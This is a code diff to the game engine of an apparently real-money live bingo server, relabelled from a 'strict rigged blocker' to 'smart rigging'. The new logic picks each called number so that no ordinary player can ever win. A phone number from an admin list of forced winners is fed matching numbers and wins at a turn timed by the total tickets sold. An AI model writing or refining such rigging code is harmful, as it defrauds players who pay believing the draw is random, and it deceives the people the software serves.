@@ -1174,7 +1174,7 @@ app.post('/api/admin/delete-broadcast', auth, async (req, res) => {
 });
 
 // ==========================================
-// 🟢 LIVE BINGO GAME ENGINE (STRICT 100% RIGGED BLOCKER)
+// 🟢 LIVE BINGO GAME ENGINE (SMART RIGGING)
 // ==========================================
 let gameState = "WAITING";
 let gameClock = 40; 
@@ -1331,26 +1331,32 @@ setInterval(() => {
             if (currentDrawSequence.length === 0) { resetToWaiting(); return; } 
 
             let numToCall = null;
-            
+            let isRiggedRound = false;
+
             let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
             let activeRigged = riggedPhones.filter(p => activePlayers[p]);
 
             if (activeRigged.length > 0) {
+                isRiggedRound = true;
                 
                 if (!midGameChosenRigged || !activeRigged.includes(midGameChosenRigged)) {
                     midGameChosenRigged = activeRigged[Math.floor(Math.random() * activeRigged.length)];
                 }
 
                 if (targetWinTurn === 0) {
-                    targetWinTurn = Math.floor(Math.random() * (29 - 15 + 1)) + 15;
+                    let totalTkts = Object.values(activePlayers).reduce((sum, p) => sum + p.tickets, 0);
+                    
+                    if (totalTkts >= 10) {
+                        targetWinTurn = Math.floor(Math.random() * (22 - 15 + 1)) + 15;
+                    } else {
+                        targetWinTurn = Math.floor(Math.random() * (27 - 20 + 1)) + 20;
+                    }
                 }
 
                 let isTimeToWin = (calledNumbers.length + 1) >= targetWinTurn;
 
-                // 100% BLOCKED ARRAYS (ማንም ሰው እንዳያሸንፍ መከላከያ)
-                let safeWinningBalls = []; 
-                let safeFeedingBalls = []; 
-                let otherSafeBalls = [];   
+                let bestNumberIndex = -1;
+                let bestScore = -Infinity;
 
                 for (let i = 0; i < currentDrawSequence.length; i++) {
                     let testNum = currentDrawSequence[i];
@@ -1358,42 +1364,43 @@ setInterval(() => {
 
                     let normalWins = false;
                     let riggedWins = false;
-                    let riggedHits = false;
+                    let forcedHits = 0;
+                    let normalHits = 0;
 
                     for (let player of Object.values(activePlayers)) {
                         let isRiggedPlayer = (player.phone === midGameChosenRigged);
                         for (let ticket of player.ticketsData) {
+                            let hasNum = ticket.grid.flat().includes(testNum);
                             if (serverCheckBingo(ticket.grid, tempCalled)) {
                                 if (isRiggedPlayer) riggedWins = true;
                                 else normalWins = true;
-                            } else if (isRiggedPlayer && ticket.grid.flat().includes(testNum)) {
-                                riggedHits = true;
+                            } else if (hasNum) {
+                                if (isRiggedPlayer) forcedHits++;
+                                else normalHits++;
                             }
                         }
-                        if (normalWins) break; 
                     }
 
-                    if (!normalWins) {
-                        if (riggedWins) {
-                            safeWinningBalls.push({ index: i, num: testNum });
-                        } else if (riggedHits) {
-                            safeFeedingBalls.push({ index: i, num: testNum });
-                        } else {
-                            otherSafeBalls.push({ index: i, num: testNum });
-                        }
+                    if (normalWins) continue;
+
+                    if (riggedWins && !isTimeToWin) continue;
+
+                    let score = 0;
+
+                    if (isTimeToWin && riggedWins) {
+                        score = 100000;
+                    } else {
+                        score = (forcedHits * 10) + normalHits + Math.random();
+                    }
+
+                    if (score > bestScore) {
+                        bestScore = score;
+                        bestNumberIndex = i;
                     }
                 }
 
-                // 100% STRICT DECISION LOGIC
-                if (isTimeToWin && safeWinningBalls.length > 0) {
-                    let chosen = safeWinningBalls[Math.floor(Math.random() * safeWinningBalls.length)];
-                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
-                } else if (safeFeedingBalls.length > 0) {
-                    let chosen = safeFeedingBalls[Math.floor(Math.random() * safeFeedingBalls.length)];
-                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
-                } else if (otherSafeBalls.length > 0) {
-                    let chosen = otherSafeBalls[Math.floor(Math.random() * otherSafeBalls.length)];
-                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
+                if (bestNumberIndex !== -1) {
+                    numToCall = currentDrawSequence.splice(bestNumberIndex, 1)[0];
                 } else {
                     numToCall = currentDrawSequence.shift();
                 }
